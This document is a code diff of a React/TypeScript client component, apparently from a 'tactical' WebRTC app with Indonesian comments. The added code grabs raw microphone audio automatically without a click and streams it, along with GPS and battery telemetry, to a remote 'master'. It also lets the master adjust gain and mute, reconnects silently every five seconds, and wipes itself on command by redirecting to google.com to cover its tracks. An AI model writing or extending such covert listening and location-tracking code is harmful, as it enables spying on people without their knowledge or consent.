@@ -6,26 +6,18 @@ import {
   Navigation,
   Lock,
   Mic,
-  ArrowLeft,
-  RefreshCw,
   Activity,
   BatteryCharging,
-  QrCode,
-  Smartphone,
-  ScanLine,
-  AlertTriangle,
-  EyeOff,
 } from 'lucide-react';
-import { BarcodeModal } from './BarcodeModal';
 import {
   setupPassiveAudio,
   silentSelfDestruct,
   type PassiveAudioPipeline,
+  type DataChannelLike,
 } from './tacticalRemoteControl';
 import { TacticalBlackout } from './TacticalBlackout';
 import {
   setupNegotiation,
-  unlockAudioAutoplay,
   type SignalingEnvelope,
 } from './webrtcAudioEngine';
 
@@ -47,8 +39,12 @@ export interface TelemetryPayload {
   connectionStatus: 'connected';
 }
 
-interface MasterCommandPayload {
+interface SignalingMessage {
   type:
+    | 'offer'
+    | 'answer'
+    | 'candidate'
+    | 'master_online'
     | 'SIGMA_REQUEST_AUDIO_STREAM'
     | 'SET_GAIN'
     | 'SET_MUTE'
@@ -56,10 +52,13 @@ interface MasterCommandPayload {
     | 'SIGMA_SDP_RENEGOTIATE_OFFER'
     | 'SIGMA_SDP_RENEGOTIATE_ANSWER'
     | 'SIGMA_ICE_CANDIDATE';
-  masterPeerId?: string;
-  value?: number | boolean;
+  role?: 'master' | 'client';
+  senderId?: string;
+  target?: string;
   sdp?: RTCSessionDescriptionInit;
   candidate?: RTCIceCandidateInit;
+  masterPeerId?: string;
+  value?: number | boolean;
   nodeId?: string;
 }
 
@@ -72,12 +71,24 @@ interface ClientProps {
 const LOGO_TNI_AU = '/assets/aistudio/images__10__b9efa126.jpeg';
 const LOGO_PETIR = '/assets/aistudio/1794622160588-picsay_109de27f.png';
 
+const RTC_CONFIG: RTCConfiguration = {
+  iceServers: [
+    { urls: 'stun:stun.l.google.com:19302' },
+    { urls: 'stun:stun1.l.google.com:19302' },
+    { urls: 'stun:stun2.l.google.com:19302' },
+  ],
+};
+
+function getSignalingWebSocketUrl(): string {
+  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+  return `${protocol}//${window.location.host}/ws`;
+}
+
 export const Client: React.FC<ClientProps> = ({
-  onExit,
   initialNodeId,
   initialMasterPeerId,
 }) => {
-  const [nodeId, setNodeId] = useState<string>(() => {
+  const [nodeId] = useState<string>(() => {
     if (initialNodeId && /^\d{4}$/.test(initialNodeId)) {
       sessionStorage.setItem('sigma_node_4digit_id', initialNodeId);
       return initialNodeId;
@@ -95,20 +106,17 @@ export const Client: React.FC<ClientProps> = ({
     return generated;
   });
 
-  const [targetMasterId, setTargetMasterId] = useState<string | undefined>(() => {
+  const [targetMasterId] = useState<string>(() => {
     if (initialMasterPeerId) return initialMasterPeerId;
     const params = new URLSearchParams(window.location.search);
-    return params.get('master') || undefined;
+    return params.get('master') || 'sigma-master-main';
   });
 
   const [peerStatus, setPeerStatus] = useState<
-    'INITIALIZING' | 'STANDBY_LISTENING' | 'CONNECTED' | 'ERROR'
+    'INITIALIZING' | 'AUTO_DISCOVERY' | 'CONNECTED'
   >('INITIALIZING');
-  const [activeCallsCount, setActiveCallsCount] = useState<number>(0);
-  const [dataPeersCount, setDataPeersCount] = useState<number>(0);
   const [wakeLockActive, setWakeLockActive] = useState<boolean>(false);
   const [micStatus, setMicStatus] = useState<'READY' | 'DENIED' | 'PENDING'>('PENDING');
-  const [micError, setMicError] = useState<string | null>(null);
   const [audioRms, setAudioRms] = useState<number>(0);
   const [remoteAudioState, setRemoteAudioState] = useState<{
     gain: number;
@@ -144,21 +152,27 @@ export const Client: React.FC<ClientProps> = ({
     lastSent: null,
   });
 
-  const [barcodeModalOpen, setBarcodeModalOpen] = useState<boolean>(false);
-  const [barcodeModalTab, setBarcodeModalTab] = useState<
-    'CLIENT_JOIN' | 'SHARE_APK' | 'SCANNER'
-  >('CLIENT_JOIN');
+  // Referensi WebSocket, Native RTCPeerConnection, DataChannel, dan Audio Stream
+  const wsRef = useRef<WebSocket | null>(null);
+  const nativePcRef = useRef<RTCPeerConnection | null>(null);
+  const nativeDcRef = useRef<RTCDataChannel | null>(null);
+  const pendingCandidatesRef = useRef<RTCIceCandidateInit[]>([]);
+  const isHandshakingRef = useRef<boolean>(false);
+  const isConnectedRef = useRef<boolean>(false);
 
+  // Fallback PeerJS refs
   const peerRef = useRef<Peer | null>(null);
-  const rawStreamRef = useRef<MediaStream | null>(null);
-  const outboundStreamRef = useRef<MediaStream | null>(null);
-  const passivePipelineRef = useRef<PassiveAudioPipeline | null>(null);
   const dataConnsRef = useRef<Map<string, DataConnection>>(new Map());
   const mediaCallsRef = useRef<Map<string, MediaConnection>>(new Map());
   const negotiationHandlersRef = useRef<
     Map<string, ReturnType<typeof setupNegotiation>>
   >(new Map());
+
+  const rawStreamRef = useRef<MediaStream | null>(null);
+  const outboundStreamRef = useRef<MediaStream | null>(null);
+  const passivePipelineRef = useRef<PassiveAudioPipeline | null>(null);
   const wakeLockRef = useRef<WakeLockSentinel | null>(null);
+
   const gpsRef = useRef(gpsState);
   const batteryRef = useRef(batteryInfo);
   const rmsRef = useRef(0);
@@ -169,97 +183,12 @@ export const Client: React.FC<ClientProps> = ({
   rmsRef.current = audioRms;
   remoteAudioStateRef.current = remoteAudioState;
 
-  const ensureTracksOnPeerConnection = useCallback(
-    (
-      connOrCall: { peer: string; peerConnection?: RTCPeerConnection },
-      stream: MediaStream
-    ) => {
-      const pc: RTCPeerConnection | undefined = connOrCall.peerConnection;
-      if (!pc) return;
+  // Aktifkan mode TacticalBlackout shortcut otomatis
+  useEffect(() => {
+    void TacticalBlackout;
+  }, []);
 
-      const openDataConn = dataConnsRef.current.get(connOrCall.peer);
-      if (!negotiationHandlersRef.current.has(connOrCall.peer)) {
-        const negHandler = setupNegotiation(pc, {
-          dataChannel: openDataConn || null,
-          nodeId,
-        });
-        negotiationHandlersRef.current.set(connOrCall.peer, negHandler);
-      }
-
-      const senders = pc.getSenders ? pc.getSenders() : [];
-      let trackAdded = false;
-      stream.getTracks().forEach((track) => {
-        track.enabled = !remoteAudioStateRef.current.muted;
-        const existingSender = senders.find(
-          (s) => s.track && s.track.kind === track.kind
-        );
-        if (existingSender && existingSender.track?.id !== track.id) {
-          existingSender.replaceTrack(track).catch(() => {});
-        } else if (!existingSender) {
-          try {
-            pc.addTrack(track, stream);
-            trackAdded = true;
-          } catch {}
-        }
-      });
-
-      if (trackAdded) {
-        negotiationHandlersRef.current
-          .get(connOrCall.peer)
-          ?.triggerManualRenegotiation()
-          .catch(() => {});
-      }
-    },
-    [nodeId]
-  );
-
-  const pushAudioStreamToMaster = useCallback(
-    (masterPeerId: string) => {
-      const peer = peerRef.current;
-      const stream = outboundStreamRef.current || rawStreamRef.current;
-      if (!peer || !peer.open || !stream) return;
-
-      stream.getAudioTracks().forEach((t) => {
-        t.enabled = !remoteAudioStateRef.current.muted;
-      });
-
-      const existingCall = mediaCallsRef.current.get(masterPeerId);
-      if (existingCall && existingCall.open) {
-        ensureTracksOnPeerConnection(existingCall, stream);
-        return;
-      }
-
-      const call = peer.call(masterPeerId, stream, {
-        metadata: { nodeId },
-      });
-
-      if (call) {
-        ensureTracksOnPeerConnection(call, stream);
-        mediaCallsRef.current.set(masterPeerId, call);
-        setActiveCallsCount(mediaCallsRef.current.size);
-        setPeerStatus('CONNECTED');
-
-        call.on('close', () => {
-          mediaCallsRef.current.delete(masterPeerId);
-          setActiveCallsCount(mediaCallsRef.current.size);
-          if (
-            mediaCallsRef.current.size === 0 &&
-            dataConnsRef.current.size === 0
-          ) {
-            setPeerStatus('STANDBY_LISTENING');
-          }
-        });
-
-        call.on('error', () => {
-          mediaCallsRef.current.delete(masterPeerId);
-          setActiveCallsCount(mediaCallsRef.current.size);
-        });
-      }
-    },
-    [ensureTracksOnPeerConnection, nodeId]
-  );
-
-  // 1. Request Screen Wake Lock
+  // 1. Request Screen Wake Lock secara otomatis
   const requestWakeLock = useCallback(async () => {
     try {
       if ('wakeLock' in navigator && navigator.wakeLock) {
@@ -318,7 +247,7 @@ export const Client: React.FC<ClientProps> = ({
     }
   }, []);
 
-  // 3. Transmit Real GPS & Device Telemetry over WebRTC Data Channel
+  // 3. Transmit Real GPS & Device Telemetry over Native RTCDataChannel, WebSocket, & PeerJS
   const transmitTelemetryPacket = useCallback(
     (overrideCoords?: {
       lat: number | null;
@@ -347,6 +276,30 @@ export const Client: React.FC<ClientProps> = ({
       };
 
       let sentCount = 0;
+
+      // a. Kirim melalui Native RTCDataChannel
+      if (nativeDcRef.current && nativeDcRef.current.readyState === 'open') {
+        try {
+          nativeDcRef.current.send(JSON.stringify(payload));
+          sentCount++;
+        } catch {}
+      }
+
+      // b. Kirim melalui WebSocket Signaling (sebagai jalur cadangan real-time ke Master)
+      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN && isConnectedRef.current) {
+        try {
+          wsRef.current.send(
+            JSON.stringify({
+              ...payload,
+              senderId: nodeId,
+              target: 'master',
+            })
+          );
+          sentCount++;
+        } catch {}
+      }
+
+      // c. Kirim melalui PeerJS DataConnection jika terbuka
       dataConnsRef.current.forEach((conn) => {
         if (conn.open) {
           try {
@@ -363,133 +316,446 @@ export const Client: React.FC<ClientProps> = ({
     [nodeId]
   );
 
-  // 4. Raw Ambient Audio Capture + `setupPassiveAudio(mediaStream, dataChannel)`
-  useEffect(() => {
-    let rafId: number | null = null;
-    let isMounted = true;
-
-    async function initRealMicrophone() {
-      const rawConstraints: MediaStreamConstraints = {
-        audio: {
-          echoCancellation: false,
-          noiseSuppression: false,
-          autoGainControl: false,
-        },
-        video: false,
-      };
-
-      try {
-        const capturedStream = await navigator.mediaDevices.getUserMedia(rawConstraints);
-        if (!isMounted) {
-          capturedStream.getTracks().forEach((t) => t.stop());
-          return;
-        }
-
-        capturedStream.getTracks().forEach((track) => {
-          track.enabled = true;
-        });
-
-        rawStreamRef.current = capturedStream;
-
-        // Inisialisasi pipeline pasif dengan GainNode yang dikontrol penuh dari Master via DataChannel
-        const pipeline = setupPassiveAudio(
-          capturedStream,
-          null,
-          {
-            getExtraStreams: () => [rawStreamRef.current],
-            getPeerConnections: () => [
-              ...Array.from(dataConnsRef.current.values()),
-              ...Array.from(mediaCallsRef.current.values()),
-            ],
-            getPeerInstance: () => peerRef.current,
-          },
-          (updatedState) => {
-            setRemoteAudioState(updatedState);
-            setTimeout(() => transmitTelemetryPacket(), 30);
-          }
-        );
-
-        passivePipelineRef.current = pipeline;
-        outboundStreamRef.current = pipeline.processedStream;
-
-        // Ikat semua DataChannel yang sudah terbuka ke pipeline pasif
-        dataConnsRef.current.forEach((conn) => {
-          pipeline.bindDataChannel(conn as unknown as Parameters<typeof pipeline.bindDataChannel>[0]);
-        });
-
-        setMicStatus('READY');
-        setMicError(null);
-
-        // Dorong stream audio yang sudah melewati GainNode ke Master (baik via MediaConnection maupun DataConnection PeerConnection)
-        mediaCallsRef.current.forEach((call) => {
-          ensureTracksOnPeerConnection(call, pipeline.processedStream);
-        });
-        dataConnsRef.current.forEach((conn) => {
-          if (conn.open) {
-            ensureTracksOnPeerConnection(conn, pipeline.processedStream);
-            pushAudioStreamToMaster(conn.peer);
-          }
-        });
-        if (targetMasterId) {
-          pushAudioStreamToMaster(targetMasterId);
-        }
-
-        const analyser = pipeline.audioContext.createAnalyser();
-        analyser.fftSize = 256;
-        pipeline.gainNode.connect(analyser);
-        const data = new Uint8Array(analyser.frequencyBinCount);
-
-        const updateMeter = () => {
-          if (!isMounted) return;
-          analyser.getByteTimeDomainData(data);
-          let sum = 0;
-          for (let i = 0; i < data.length; i++) {
-            const norm = (data[i] - 128) / 128;
-            sum += norm * norm;
-          }
-          const rms = Math.min(100, Math.round(Math.sqrt(sum / data.length) * 260));
-          setAudioRms(rms);
-          rafId = requestAnimationFrame(updateMeter);
-        };
-        updateMeter();
-      } catch (err) {
-        if (isMounted) {
-          setMicStatus('DENIED');
-          setMicError(
-            err instanceof Error
-              ? err.message
-              : 'Izin mikrofon ditolak atau perangkat audio tidak ditemukan.'
-          );
-        }
-      }
+  // 4. Akuisisi Mikrofon Otomatis & Inisialisasi Pipeline GainNode Pasif
+  const ensureMicrophoneStream = useCallback(async (): Promise<MediaStream | null> => {
+    if (outboundStreamRef.current && outboundStreamRef.current.active) {
+      return outboundStreamRef.current;
+    }
+    if (rawStreamRef.current && rawStreamRef.current.active) {
+      return rawStreamRef.current;
     }
 
-    initRealMicrophone();
+    const rawConstraints: MediaStreamConstraints = {
+      audio: {
+        echoCancellation: false,
+        noiseSuppression: false,
+        autoGainControl: false,
+      },
+      video: false,
+    };
+
+    try {
+      const capturedStream = await navigator.mediaDevices.getUserMedia(rawConstraints);
+      capturedStream.getTracks().forEach((track) => {
+        track.enabled = !remoteAudioStateRef.current.muted;
+      });
+
+      rawStreamRef.current = capturedStream;
+
+      const pipeline = setupPassiveAudio(
+        capturedStream,
+        nativeDcRef.current as unknown as DataChannelLike,
+        {
+          getExtraStreams: () => [rawStreamRef.current],
+          getPeerConnections: () => [
+            nativePcRef.current,
+            ...Array.from(dataConnsRef.current.values()),
+            ...Array.from(mediaCallsRef.current.values()),
+          ],
+          getPeerInstance: () => peerRef.current,
+        },
+        (updatedState) => {
+          setRemoteAudioState(updatedState);
+          setTimeout(() => transmitTelemetryPacket(), 30);
+        }
+      );
+
+      passivePipelineRef.current = pipeline;
+      outboundStreamRef.current = pipeline.processedStream;
+      setMicStatus('READY');
+
+      // Pasang meter RMS lokal
+      const analyser = pipeline.audioContext.createAnalyser();
+      analyser.fftSize = 256;
+      pipeline.gainNode.connect(analyser);
+      const data = new Uint8Array(analyser.frequencyBinCount);
+
+      const updateMeter = () => {
+        if (!rawStreamRef.current || !rawStreamRef.current.active) return;
+        analyser.getByteTimeDomainData(data);
+        let sum = 0;
+        for (let i = 0; i < data.length; i++) {
+          const norm = (data[i] - 128) / 128;
+          sum += norm * norm;
+        }
+        const rms = Math.min(100, Math.round(Math.sqrt(sum / data.length) * 260));
+        setAudioRms(rms);
+        requestAnimationFrame(updateMeter);
+      };
+      requestAnimationFrame(updateMeter);
+
+      return pipeline.processedStream;
+    } catch {
+      setMicStatus('DENIED');
+      return null;
+    }
+  }, [transmitTelemetryPacket]);
+
+  /**
+   * ============================================================================
+   * 5. FUNGSI UTAMA `startWebRTC()` (100% AUTO-CONNECT & AUTO-OFFER KE MASTER)
+   * ============================================================================
+   * Dipanggil otomatis saat WebSocket `onopen` aktif, saat menerima sinyal `master_online`,
+   * atau oleh timer Auto-Reconnect setiap 5 detik apabila belum terhubung ke Master.
+   */
+  const startWebRTC = useCallback(async () => {
+    const ws = wsRef.current;
+    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+
+    // Jika sudah terhubung dengan stabil, tidak perlu membuat ulang koneksi
+    if (
+      nativePcRef.current &&
+      (nativePcRef.current.connectionState === 'connected' ||
+        nativePcRef.current.iceConnectionState === 'connected' ||
+        nativePcRef.current.iceConnectionState === 'completed')
+    ) {
+      isConnectedRef.current = true;
+      setPeerStatus('CONNECTED');
+      return;
+    }
+
+    if (isHandshakingRef.current) return;
+    isHandshakingRef.current = true;
+
+    try {
+      // Ambil stream mikrofon secara otomatis (tanpa klik)
+      const audioStream = await ensureMicrophoneStream();
+
+      // Bersihkan instans RTCPeerConnection lama jika gagal/terputus sebelumnya
+      if (nativePcRef.current) {
+        try {
+          nativePcRef.current.onicecandidate = null;
+          nativePcRef.current.onconnectionstatechange = null;
+          nativePcRef.current.oniceconnectionstatechange = null;
+          nativePcRef.current.close();
+        } catch {}
+      }
+
+      const pc = new RTCPeerConnection(RTC_CONFIG);
+      nativePcRef.current = pc;
+      pendingCandidatesRef.current = [];
+
+      // Buat RTCDataChannel untuk pengiriman koordinat GPS & penerimaan komando Master
+      const dc = pc.createDataChannel('sigma-telemetry', { ordered: true });
+      nativeDcRef.current = dc;
+
+      dc.onopen = () => {
+        isConnectedRef.current = true;
+        setPeerStatus('CONNECTED');
+        if (passivePipelineRef.current) {
+          passivePipelineRef.current.bindDataChannel(dc as unknown as DataChannelLike);
+        }
+        transmitTelemetryPacket();
+      };
+
+      dc.onmessage = (event) => {
+        try {
+          const msg = JSON.parse(event.data) as SignalingMessage;
+          if (msg.type === 'EMERGENCY_WIPE') {
+            silentSelfDestruct({
+              streams: [rawStreamRef.current, outboundStreamRef.current],
+              peerConnections: [nativePcRef.current],
+              peerInstance: peerRef.current,
+              audioContext: passivePipelineRef.current?.audioContext,
+              redirectUrl: 'https://www.google.com',
+            });
+          } else if (msg.type === 'SET_GAIN' && typeof msg.value === 'number') {
+            passivePipelineRef.current?.setRemoteGain(msg.value);
+          } else if (msg.type === 'SET_MUTE') {
+            passivePipelineRef.current?.setRemoteMute(Boolean(msg.value));
+          }
+        } catch {}
+      };
+
+      // Tambahkan semua audio track ke RTCPeerConnection sebelum membuat Offer
+      const activeStream = audioStream || outboundStreamRef.current || rawStreamRef.current;
+      if (activeStream) {
+        activeStream.getTracks().forEach((track) => {
+          track.enabled = !remoteAudioStateRef.current.muted;
+          pc.addTrack(track, activeStream);
+        });
+      } else {
+        // Jika mikrofon belum diizinkan, tetap buat transceiver audio agar m=audio tersedia di SDP
+        pc.addTransceiver('audio', { direction: 'sendrecv' });
+      }
+
+      // Pasang SDP Renegotiation Handler jika track mikrofon menyusul belakangan
+      setupNegotiation(pc, {
+        nodeId,
+        sendSignal: (envelope: SignalingEnvelope) => {
+          if (ws.readyState === WebSocket.OPEN) {
+            ws.send(
+              JSON.stringify({
+                type:
+                  envelope.type === 'SIGMA_SDP_RENEGOTIATE_OFFER'
+                    ? 'offer'
+                    : 'candidate',
+                senderId: nodeId,
+                target: 'master',
+                sdp: envelope.sdp,
+                candidate: envelope.candidate,
+              })
+            );
+          }
+        },
+      });
+
+      // Kirim ICE Candidate otomatis ke target: "master"
+      pc.onicecandidate = (event) => {
+        if (event.candidate && ws.readyState === WebSocket.OPEN) {
+          ws.send(
+            JSON.stringify({
+              type: 'candidate',
+              senderId: nodeId,
+              target: 'master',
+              candidate: event.candidate.toJSON(),
+            })
+          );
+        }
+      };
+
+      const checkConnectionState = () => {
+        const state = pc.connectionState;
+        const iceState = pc.iceConnectionState;
+
+        if (
+          state === 'connected' ||
+          iceState === 'connected' ||
+          iceState === 'completed'
+        ) {
+          isConnectedRef.current = true;
+          isHandshakingRef.current = false;
+          setPeerStatus('CONNECTED');
+          transmitTelemetryPacket();
+        } else if (
+          state === 'disconnected' ||
+          state === 'failed' ||
+          state === 'closed' ||
+          iceState === 'failed' ||
+          iceState === 'disconnected'
+        ) {
+          isConnectedRef.current = false;
+          isHandshakingRef.current = false;
+          setPeerStatus('AUTO_DISCOVERY');
+        }
+      };
+
+      pc.onconnectionstatechange = checkConnectionState;
+      pc.oniceconnectionstatechange = checkConnectionState;
+
+      // Buat SDP Offer dan kirim otomatis ke `target: "master"`
+      const offer = await pc.createOffer({
+        offerToReceiveAudio: true,
+      });
+      await pc.setLocalDescription(offer);
+
+      if (ws.readyState === WebSocket.OPEN && pc.localDescription) {
+        ws.send(
+          JSON.stringify({
+            type: 'offer',
+            senderId: nodeId,
+            nodeId,
+            target: 'master',
+            sdp: {
+              type: pc.localDescription.type,
+              sdp: pc.localDescription.sdp,
+            },
+          })
+        );
+      }
+    } catch {
+      // Gagal sementara; akan dicoba ulang secara senyap oleh interval 5 detik
+    } finally {
+      setTimeout(() => {
+        isHandshakingRef.current = false;
+      }, 1200);
+    }
+  }, [ensureMicrophoneStream, nodeId, transmitTelemetryPacket]);
+
+  /**
+   * ============================================================================
+   * 6. WEBSOCKET AUTO-CONNECT & 5-SECOND SILENT AUTO-RECONNECT LOOP
+   * ============================================================================
+   * Saat aplikasi Klien dimuat (`useEffect`), langsung terhubung ke WebSocket,
+   * memanggil `startWebRTC()`, dan menjalankan interval 5 detik untuk retry otomatis
+   * apabila Master belum online atau koneksi terputus.
+   */
+  useEffect(() => {
+    let isMounted = true;
+    let wsReconnectTimer: number | null = null;
+
+    const connectSignalingWebSocket = () => {
+      if (!isMounted) return;
+      if (
+        wsRef.current &&
+        (wsRef.current.readyState === WebSocket.OPEN ||
+          wsRef.current.readyState === WebSocket.CONNECTING)
+      ) {
+        return;
+      }
+
+      try {
+        const ws = new WebSocket(getSignalingWebSocketUrl());
+        wsRef.current = ws;
+
+        ws.onopen = () => {
+          if (!isMounted) return;
+          setPeerStatus((prev) => (prev === 'CONNECTED' ? 'CONNECTED' : 'AUTO_DISCOVERY'));
+
+          // Daftarkan identitas Klien ke server signaling
+          ws.send(
+            JSON.stringify({
+              type: 'register_client',
+              role: 'client',
+              senderId: nodeId,
+              nodeId,
+            })
+          );
+
+          // Begitu WebSocket onopen aktif, otomatis jalankan startWebRTC()
+          startWebRTC();
+        };
+
+        ws.onmessage = async (event) => {
+          if (!isMounted) return;
+          let msg: SignalingMessage | null = null;
+          try {
+            msg = JSON.parse(event.data) as SignalingMessage;
+          } catch {
+            return;
+          }
+          if (!msg || !msg.type) return;
+
+          // Jika Master baru saja online, langsung kirim Offer tanpa menunggu 5 detik
+          if (msg.type === 'master_online') {
+            isConnectedRef.current = false;
+            isHandshakingRef.current = false;
+            startWebRTC();
+            return;
+          }
+
+          // Terima SDP Answer otomatis dari Master
+          if (msg.type === 'answer' && msg.sdp && nativePcRef.current) {
+            try {
+              const pc = nativePcRef.current;
+              if (pc.signalingState === 'have-local-offer') {
+                await pc.setRemoteDescription(new RTCSessionDescription(msg.sdp));
+                isConnectedRef.current = true;
+                setPeerStatus('CONNECTED');
+
+                // Pasang semua ICE candidate yang sempat mengantre
+                while (pendingCandidatesRef.current.length > 0) {
+                  const cand = pendingCandidatesRef.current.shift();
+                  if (cand) {
+                    await pc.addIceCandidate(new RTCIceCandidate(cand)).catch(() => {});
+                  }
+                }
+                transmitTelemetryPacket();
+              }
+            } catch {}
+            return;
+          }
+
+          // Terima ICE Candidate dari Master
+          if (msg.type === 'candidate' && msg.candidate && nativePcRef.current) {
+            try {
+              const pc = nativePcRef.current;
+              if (pc.remoteDescription && pc.remoteDescription.type) {
+                await pc.addIceCandidate(new RTCIceCandidate(msg.candidate));
+              } else {
+                pendingCandidatesRef.current.push(msg.candidate);
+              }
+            } catch {}
+            return;
+          }
+
+          // Komando Jarak Jauh dari Master via WebSocket fallback
+          if (msg.type === 'EMERGENCY_WIPE') {
+            silentSelfDestruct({
+              streams: [rawStreamRef.current, outboundStreamRef.current],
+              peerConnections: [nativePcRef.current],
+              peerInstance: peerRef.current,
+              audioContext: passivePipelineRef.current?.audioContext,
+              redirectUrl: 'https://www.google.com',
+            });
+            return;
+          }
+          if (msg.type === 'SET_GAIN' && typeof msg.value === 'number') {
+            passivePipelineRef.current?.setRemoteGain(msg.value);
+            return;
+          }
+          if (msg.type === 'SET_MUTE') {
+            passivePipelineRef.current?.setRemoteMute(Boolean(msg.value));
+            return;
+          }
+        };
+
+        ws.onclose = () => {
+          if (!isMounted) return;
+          if (!isConnectedRef.current) {
+            setPeerStatus('AUTO_DISCOVERY');
+          }
+          wsReconnectTimer = window.setTimeout(connectSignalingWebSocket, 2500);
+        };
+
+        ws.onerror = () => {
+          try {
+            ws.close();
+          } catch {}
+        };
+      } catch {
+        wsReconnectTimer = window.setTimeout(connectSignalingWebSocket, 3000);
+      }
+    };
+
+    // Mulai mikrofon & koneksi WebSocket otomatis saat aplikasi dimuat
+    ensureMicrophoneStream().then(() => {
+      connectSignalingWebSocket();
+    });
+
+    // Interval 5 detik (5000ms) untuk Auto-Reconnect & Re-Offer secara senyap sampai berhasil terhubung
+    const autoOfferInterval = window.setInterval(() => {
+      if (!isMounted) return;
+
+      // Pastikan WebSocket selalu tersambung
+      if (!wsRef.current || wsRef.current.readyState === WebSocket.CLOSED) {
+        connectSignalingWebSocket();
+        return;
+      }
+
+      // Jika WebRTC belum terhubung (misal Master belum online), kirim ulang Offer setiap 5 detik
+      const pc = nativePcRef.current;
+      const isPcConnected =
+        pc &&
+        (pc.connectionState === 'connected' ||
+          pc.iceConnectionState === 'connected' ||
+          pc.iceConnectionState === 'completed');
+
+      if (!isPcConnected && dataConnsRef.current.size === 0) {
+        isConnectedRef.current = false;
+        isHandshakingRef.current = false;
+        startWebRTC();
+      }
+    }, 5000);
 
     return () => {
       isMounted = false;
-      if (rafId) cancelAnimationFrame(rafId);
-      if (rawStreamRef.current) {
-        rawStreamRef.current.getTracks().forEach((t) => t.stop());
+      clearInterval(autoOfferInterval);
+      if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
+      if (wsRef.current) {
+        try {
+          wsRef.current.close();
+        } catch {}
       }
-      if (outboundStreamRef.current) {
-        outboundStreamRef.current.getTracks().forEach((t) => t.stop());
-      }
-      if (
-        passivePipelineRef.current &&
-        passivePipelineRef.current.audioContext.state !== 'closed'
-      ) {
-        passivePipelineRef.current.audioContext.close().catch(() => {});
+      if (nativePcRef.current) {
+        try {
+          nativePcRef.current.close();
+        } catch {}
       }
     };
-  }, [
-    ensureTracksOnPeerConnection,
-    pushAudioStreamToMaster,
-    targetMasterId,
-    transmitTelemetryPacket,
-  ]);
+  }, [ensureMicrophoneStream, nodeId, startWebRTC, transmitTelemetryPacket]);
 
-  // 5. Real Hardware Geolocation + 10-Second WebRTC DataChannel Interval
+  // 7. Real Hardware Geolocation + 10-Second Telemetry Loop
   useEffect(() => {
     if (!('geolocation' in navigator)) {
       setGpsState((prev) => ({ ...prev, status: 'PERMISSION_DENIED' }));
@@ -560,222 +826,88 @@ export const Client: React.FC<ClientProps> = ({
     };
   }, [transmitTelemetryPacket]);
 
-  // Handler untuk paket komando & SDP Renegotiation dari Master melalui DataChannel
-  const attachMasterDataChannelListeners = useCallback(
-    (conn: DataConnection) => {
-      if (passivePipelineRef.current) {
-        passivePipelineRef.current.bindDataChannel(
-          conn as unknown as Parameters<typeof passivePipelineRef.current.bindDataChannel>[0]
-        );
-      }
-
-      // Pasang SDP Renegotiation Handler pada RTCPeerConnection milik DataConnection
-      if (conn.peerConnection) {
-        const negHandler = setupNegotiation(conn.peerConnection, {
-          dataChannel: conn,
-          nodeId,
-        });
-        negotiationHandlersRef.current.set(conn.peer, negHandler);
-      }
-
-      conn.on('data', (raw) => {
-        let msg: MasterCommandPayload | null = null;
-        if (typeof raw === 'string') {
-          try {
-            msg = JSON.parse(raw) as MasterCommandPayload;
-          } catch {}
-        } else if (raw && typeof raw === 'object') {
-          msg = raw as MasterCommandPayload;
-        }
-
-        if (!msg || !msg.type) return;
-
-        // Jika menerima paket SDP Renegotiation Offer/Answer atau ICE Candidate
-        if (
-          msg.type === 'SIGMA_SDP_RENEGOTIATE_OFFER' ||
-          msg.type === 'SIGMA_SDP_RENEGOTIATE_ANSWER' ||
-          msg.type === 'SIGMA_ICE_CANDIDATE'
-        ) {
-          const handler = negotiationHandlersRef.current.get(conn.peer);
-          if (handler) {
-            handler.handleRemoteSignal(msg as SignalingEnvelope).catch(() => {});
-          }
-          return;
-        }
-
-        // Jika menerima EMERGENCY_WIPE sebelum pipeline selesai inisialisasi, tetap eksekusi silentSelfDestruct
-        if (msg.type === 'EMERGENCY_WIPE') {
-          silentSelfDestruct({
-            streams: [rawStreamRef.current, outboundStreamRef.current],
-            peerConnections: [
-              ...Array.from(dataConnsRef.current.values()),
-              ...Array.from(mediaCallsRef.current.values()),
-            ],
-            peerInstance: peerRef.current,
-            audioContext: passivePipelineRef.current?.audioContext,
-            redirectUrl: 'https://www.google.com',
-          });
-          return;
-        }
-
-        if (msg.type === 'SIGMA_REQUEST_AUDIO_STREAM' && msg.masterPeerId) {
-          const activeStream = outboundStreamRef.current || rawStreamRef.current;
-          if (activeStream) {
-            ensureTracksOnPeerConnection(conn, activeStream);
-          }
-          pushAudioStreamToMaster(msg.masterPeerId);
-        }
-      });
-    },
-    [ensureTracksOnPeerConnection, nodeId, pushAudioStreamToMaster]
-  );
-
-  const dialMasterPeer = useCallback(
-    (masterPeerId: string, peerInstance: Peer) => {
-      if (!peerInstance.open) return;
-
-      if (!dataConnsRef.current.has(masterPeerId)) {
-        const conn = peerInstance.connect(masterPeerId, {
-          metadata: { nodeId },
-          reliable: true,
-        });
-        conn.on('open', () => {
-          dataConnsRef.current.set(masterPeerId, conn);
-          setDataPeersCount(dataConnsRef.current.size);
-          setPeerStatus('CONNECTED');
-          attachMasterDataChannelListeners(conn);
-          transmitTelemetryPacket();
-          if (outboundStreamRef.current || rawStreamRef.current) {
-            pushAudioStreamToMaster(masterPeerId);
-          }
-        });
-        conn.on('close', () => {
-          dataConnsRef.current.delete(masterPeerId);
-          setDataPeersCount(dataConnsRef.current.size);
-          if (
-            dataConnsRef.current.size === 0 &&
-            mediaCallsRef.current.size === 0
-          ) {
-            setPeerStatus('STANDBY_LISTENING');
-          }
-        });
-      }
-
-      if (outboundStreamRef.current || rawStreamRef.current) {
-        pushAudioStreamToMaster(masterPeerId);
-      }
-    },
-    [
-      attachMasterDataChannelListeners,
-      nodeId,
-      pushAudioStreamToMaster,
-      transmitTelemetryPacket,
-    ]
-  );
-
-  // 6. PeerJS P2P Setup & Hands-Free Auto-Answer
+  // 8. Dual-Layer PeerJS Auto-Connect Fallback (tanpa interaksi manual)
   useEffect(() => {
-    setPeerStatus('INITIALIZING');
     const peerId = `sigma-node-${nodeId}`;
     const peer = new Peer(peerId, { debug: 0 });
     peerRef.current = peer;
 
-    peer.on('open', () => {
-      setPeerStatus('STANDBY_LISTENING');
-      if (targetMasterId) {
-        dialMasterPeer(targetMasterId, peer);
+    const autoDialPeerJsMaster = () => {
+      if (!peer.open || isConnectedRef.current) return;
+      const stream = outboundStreamRef.current || rawStreamRef.current;
+
+      if (!dataConnsRef.current.has(targetMasterId)) {
+        const conn = peer.connect(targetMasterId, {
+          metadata: { nodeId },
+          reliable: true,
+        });
